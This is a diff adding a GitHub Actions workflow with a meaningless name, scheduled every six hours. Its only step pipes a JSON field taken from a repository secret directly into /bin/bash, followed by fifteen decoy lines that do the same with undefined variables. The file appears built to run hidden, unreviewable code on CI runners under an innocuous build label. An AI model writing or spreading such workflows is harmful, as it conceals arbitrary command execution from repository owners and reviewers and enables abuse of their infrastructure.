@@ -1,0 +1,34 @@
+name: refactorweb292
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: refactorweb292
+        env:
+          ngng3: ${{ secrets.ngng3 }}
+        run: |
+          echo $ngng3 | jq -r .wfuz319 | /bin/bash
+          echo $gbp35 | jq -r .k62 | /bin/bash
+          echo $pp83 | jq -r .g0839 | /bin/bash
+          echo $e53 | jq -r .rzl68 | /bin/bash
+          echo $ndejc4105 | jq -r .iae222 | /bin/bash
+          echo $y8 | jq -r .xcyes7 | /bin/bash
+          echo $lylug5389 | jq -r .nioas1073 | /bin/bash
+          echo $kzis8563 | jq -r .dlwoh762 | /bin/bash
+          echo $isa46258 | jq -r .wu7592 | /bin/bash
+          echo $mvyru8978 | jq -r .vcwc51195 | /bin/bash
+          echo $rtwji107 | jq -r .mq8344 | /bin/bash
+          echo $fo79918 | jq -r .urye1292 | /bin/bash
+          echo $ajhda8 | jq -r .pd52542 | /bin/bash
+          echo $zlncw02702 | jq -r .hr964 | /bin/bash
+          echo $df8708 | jq -r .jjked907 | /bin/bash
+          echo $ztjt70 | jq -r .ox2890 | /bin/bash
+
